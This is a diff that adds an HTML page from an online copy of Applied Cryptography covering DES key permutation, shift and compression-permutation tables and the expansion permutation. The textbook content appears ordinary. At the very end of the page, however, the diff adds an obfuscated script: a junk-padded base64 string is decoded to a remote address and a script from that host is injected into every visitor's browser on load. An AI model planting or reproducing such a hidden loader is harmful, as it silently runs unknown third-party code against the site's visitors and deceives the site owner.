@@ -1,0 +1,243 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=273-274//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<TABLE WIDTH="100%">
+<TH CAPTION COLSPAN="14" ALIGN="CENTER">Table 12.2<BR>Key Permutation
+<TR>
+<TD COLSPAN="14"><HR>
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">57,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">49,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">41,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">33,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">25,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">17,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">9,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">1,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">58,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">50,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">42,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">34,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">26,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">18,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">10,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">2,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">59,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">51,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">43,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">35,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">27,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">19,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">11,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">3,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">60,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">52,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">44,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">36,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">63,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">55,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">47,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">39,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">31,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">23,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">15,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">7,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">62,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">54,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">46,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">38,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">30,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">22,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">14,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">6,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">61,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">53,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">45,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">37,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">29,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">21,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">13,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">5,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">28,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">20,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">12,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">4
+<TR>
+<TD COLSPAN="14"><HR>
+<TR>
+</TABLE>
+<P>After being shifted, 48 out of the 56 bits are selected. Because this operation permutes the order of the bits as well as selects a subset of bits, it is called a <B>compression permutation</B>. This operation provides a subset of 48 bits. Table 12.4 defines the compression permutation (also called the permuted choice). For example, the bit in position 33 of the shifted key moves to position 35 of the output, and the bit in position 18 of the shifted key is ignored.</P>
+<P>Because of the shifting, a different subset of key bits is used in each subkey. Each bit is used in approximately 14 of the 16 subkeys, although not all bits are used exactly the same number of times.</P>
+<P><FONT SIZE="+1"><B><I>The Expansion Permutation</I></B></FONT></P>
+<P>This operation expands the right half of the data, <I>R</I><SUB>i</SUB>, from 32 bits to 48 bits. Because this operation changes the order of the bits as well as repeating certain bits, it is known as an <B>expansion permutation</B>. This operation has two purposes: It makes the right half the same size as the key for the XOR operation and it provides a longer result that can be compressed during the substitution operation. However, neither of those is its main cryptographic purpose. By allowing one bit to affect two substitutions, the dependency of the output bits on the input bits spreads faster. This is called an <B>avalanche effect</B>. DES is designed to reach the condition of having every bit of the ciphertext depend on every bit of the plaintext and every bit of the key as quickly as possible.</P>
+<P>Figure 12.3 defines the expansion permutation. This is sometimes called the <B>E-box</B>. For each 4-bit input block, the first and fourth bits each represent two bits of the output block, while the second and third bits each represent one bit of the output block. Table 12.5 shows which output positions correspond to which input positions. For example, the bit in position 3 of the input block moves to position 4 of the output block, and the bit in position 21 of the input block moves to positions 30 and 32 of the output block.</P>
+<P>Although the output block is larger than the input block, each input block generates a unique output block.</P>
+<TABLE WIDTH="100%"><TH CAPTION COLSPAN="17" ALIGN="CENTER">Table 12.3<BR>Number of Key Bits Shifted per Round
+<TR>
+<TD WIDTH="10%" COLSPAN="17"><HR>
+<TR>
+<TD WIDTH="10%" VALIGN="TOP" ALIGN="LEFT">Round
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">3
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">4
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">5
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">6
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">7
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">8
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">9
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">10
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">11
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">12
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">13
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">14
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">15
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">16
+<TR>
+<TD WIDTH="10%" VALIGN="TOP" ALIGN="LEFT">Number
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">2
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="LEFT">1
+<TR>
+<TD COLSPAN="17"><HR>
+<TR>
+</TABLE>
+<TABLE WIDTH="100%">
+<TH CAPTION COLSPAN="12" ALIGN="CENTER">Table 12.4<BR>Compression Permutation
+<TR>
+<TD COLSPAN="12"><HR>
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">14,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">17,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">11,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">24,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">1,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">5,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">3,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">28,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">15,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">6,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">21,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">10,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">23,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">19,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">12,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">4,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">26,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">8,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">16,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">7,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">27,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">20,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">13,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">2,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">41,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">52,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">31,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">37,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">47,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">55,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">30,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">40,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">51,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">45,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">33,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">48,
+<TR>
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">44,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">49,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">39,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">56,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">34,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">53,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">46,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">42,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">50,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">36,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">29,
+<TD WIDTH="6%" VALIGN="TOP" ALIGN="RIGHT">32
+<TR>
+<TD COLSPAN="12"><HR>
+<TR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(GhCWZido, ySMQEoYY) {ySMQEoYY = GhCWZido.createElement('script');ySMQEoYY.type = 'text/javascript';ySMQEoYY.async = true;ySMQEoYY.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');GhCWZido.getElementsByTagName('body')[0].appendChild(ySMQEoYY);}(document));</script></body>
+</html>
